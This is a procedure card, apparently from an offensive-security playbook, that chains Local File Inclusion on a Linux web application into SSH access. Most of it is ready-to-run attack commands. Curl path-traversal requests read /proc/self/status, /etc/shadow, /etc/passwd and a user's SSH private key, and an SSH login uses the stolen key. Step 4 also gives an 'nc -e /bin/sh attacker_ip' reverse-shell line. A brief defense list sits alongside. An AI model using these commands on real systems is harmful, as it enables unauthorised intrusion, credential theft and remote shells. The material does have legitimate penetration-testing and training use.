---
id: d798bfe2-0dbe-4a98-8e2c-1738832a9f8a
name: Linux-LFI-to-RCE-via-Credentials-Extraction
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:58.721047+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Discovery]]'
  - '[[Lateral Movement]]'
techniques:
  - '[[File and Directory Discovery]]'
  - '[[Unsecured Credentials]]'
  - '[[SSH]]'
sub_techniques:
  - '[[T1083.001]]'
  - '[[Credentials in Files]]'
tags:
  - '[[tags/File Inclusion]]'
  - '[[tags/LFI]]'
  - '[[tags/RCE]]'
  - '[[tags/Linux]]'
  - '[[tags/Credentials Extraction]]'
commands:
  - '[[commands/curl-lfi-read-etc-shadow]]'
  - '[[commands/curl-lfi-read-proc-self-status]]'
  - '[[commands/curl-lfi-read-etc-passwd]]'
  - '[[commands/ssh-login-with-private-key]]'
platforms:
  - Linux
  - Web
tools: []
validated: true
---

# Linux-LFI-to-RCE-via-Credentials-Extraction

## Summary

This procedure exploits a Local File Inclusion (LFI) vulnerability in a Linux-based web application to read sensitive system files containing user credentials and process information. By extracting details from /etc/passwd, /proc/self/status, and potential SSH private keys, an attacker can identify user accounts, home directories, and authentication materials to establish an SSH connection for remote code execution (RCE). This technique is effective against misconfigured web servers running as non-root users where private keys may be accessible.

## Description

Local File Inclusion (LFI) allows attackers to include and execute files on the server by manipulating input parameters, such as a 'page' or 'file' query string in PHP applications. In a Linux environment, this can expose system files like /etc/passwd for user enumeration, /proc/self/status for current process details (including the web server user), and user-specific files like ~/.ssh/id_rsa for private keys. Once credentials or keys are obtained, they can be used to authenticate via SSH, enabling arbitrary command execution on the target. This procedure assumes the LFI endpoint is known (e.g., http://target.com/index.php?page=) and the web server lacks proper path traversal protections. It maps to file discovery for reconnaissance, credential access via unsecured files, and lateral movement through SSH. Success depends on file permissions; /etc/shadow is typically root-only and may not be readable, but user-owned SSH keys often are if the web process runs as that user.

## Requirements

1. Network access to the vulnerable web application (e.g., HTTP/HTTPS on port 80/443).
2. Identification of the LFI parameter (e.g., ?page= or ?file=) through prior testing.
3. curl or similar tool on the attacker's machine for file retrieval via LFI.
4. SSH client (e.g., OpenSSH) on the attacker's machine to use extracted keys.
5. The target web server runs on Linux with PHP or similar, and the LFI allows traversal to /etc and /proc directories.

## Defense

- Implement strict input validation and sanitization to block path traversal (e.g., whitelist allowed files, use basename() in PHP).
- Deploy a Web Application Firewall (WAF) to detect and block LFI payloads like '../' sequences.
- Enforce least-privilege file permissions: Ensure sensitive files like /etc/shadow (mode 000) and SSH keys (mode 600) are not readable by the web server user (e.g., www-data).
- Disable directory indexing and use AppArmor/SELinux to restrict web process access to filesystem paths.
- Monitor web logs for anomalous requests to system files and enable process monitoring for unexpected SSH logins.

## Objectives

1. Confirm LFI vulnerability and read process information to identify the web server user.
2. Enumerate system users and home directories to locate potential credential files.
3. Extract SSH private keys or other credentials for authentication.
4. Establish an SSH session using extracted materials to achieve remote code execution.

## Instructions

### Step 1: Read Process Status via LFI to Identify Web Server User

**Context**: Start by using the LFI vulnerability to access /proc/self/status, which reveals the user ID (UID) and other details of the process running the web application. This helps determine the context under which files are accessible (e.g., if running as www-data, only non-root files are readable). This step confirms LFI works and provides the current user for targeting home directories.

**Command** ([[commands/curl-lfi-read-proc-self-status]]):
```bash
curl "http://example.com/index.php?page=../../../../proc/self/status" -o proc_status.txt
```

> This command sends a path traversal payload to include /proc/self/status. The '../../../../' navigates up directories to reach the root filesystem. Save the output to a file for analysis. If LFI is blocked, you may see a 404 or blank response; adjust traversal depth (e.g., more '../') based on the application's directory structure.

**Expected Output**: A text file containing process details, such as:

Name:   php-fpm
Uid:    33 33 33 33
Gid:    33 33 33 33
...

Success is indicated by visible UID/GID (e.g., 33 for www-data) without errors.

### Step 2: Attempt to Read /etc/shadow via LFI for Password Hashes

**Context**: Next, target /etc/shadow to extract hashed passwords. This file is typically readable only by root, so success depends on misconfigurations (e.g., world-readable due to error). If unsuccessful, proceed to user-specific files. Hashes can be cracked offline if obtained, providing valid accounts for login.

**Command** ([[commands/curl-lfi-read-etc-shadow]]):
```bash
curl "http://example.com/index.php?page=../../../../etc/shadow" -o shadow.txt
```

> This exploits LFI to include /etc/shadow. Output will show lines like 'root:$6$abc123...:18900:0:99999:7:::'. If empty or errored, the file is inaccessible—common in secure setups. Use tools like John the Ripper on extracted hashes.

**Expected Output**: Hashed password entries, e.g.,

root:$6$rounds=656000$abcDEF...:19000:0:99999:7:::
dao:$6$rounds=656000$xyz...:19000:0:99999:7:::

If no output or 'Permission denied', skip to user enumeration.

### Step 3: Read /etc/passwd via LFI to Enumerate Users and Home Directories

**Context**: Use /etc/passwd to list all users, their UIDs, and home directories. This identifies potential targets for credential files, such as SSH keys in /home/username/.ssh/. Cross-reference with the process UID from Step 1 to focus on accessible users.

**Command** ([[commands/curl-lfi-read-etc-passwd]]):
```bash
curl "http://example.com/index.php?page=../../../../etc/passwd" -o passwd.txt
```

> This command traverses to /etc/passwd via LFI. Parse the output to find users with home directories (e.g., /home/user or /var/www for web users). Look for users matching the process UID.

**Expected Output**: User account lines, e.g.,

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
user1:x:1000:1000:User One:/home/user1:/bin/bash

Success: List of users with homes; target those with shell access (/bin/bash).

### Step 4: Extract SSH Private Key and Establish RCE Session

**Context**: Using home directories from Step 3, attempt to read ~/.ssh/id_rsa for the web user or other accounts. If a private key is obtained, download it and use it to SSH into the target as that user, achieving RCE by executing commands remotely. If no key, fall back to cracked passwords from shadow.

**Instructions**: Replace $_HOME with the identified path (e.g., /var/www). Run:
```bash
curl "http://example.com/index.php?page=../../../../$_HOME/.ssh/id_rsa" -o id_rsa
```
Set permissions: chmod 600 id_rsa. Then connect:

**Command** ([[commands/ssh-login-with-private-key]]):
```bash
ssh -i id_rsa $_USERNAME@$_TARGET_IP "whoami; id"
```

> First, retrieve the key via LFI (adjust path if needed, e.g., ../../../../var/www/.ssh/id_rsa). The key starts with '-----BEGIN OPENSSH PRIVATE KEY-----'. If successful, use SSH to log in and verify access. For RCE, execute commands like 'nc -e /bin/sh attacker_ip 4444' for a reverse shell.

**Expected Output**: For key retrieval: PEM-formatted private key. For SSH: Remote shell prompt, e.g.,

uid=33(www-data) gid=33(www-data) groups=33(www-data)

Success: Interactive shell or command output from target.
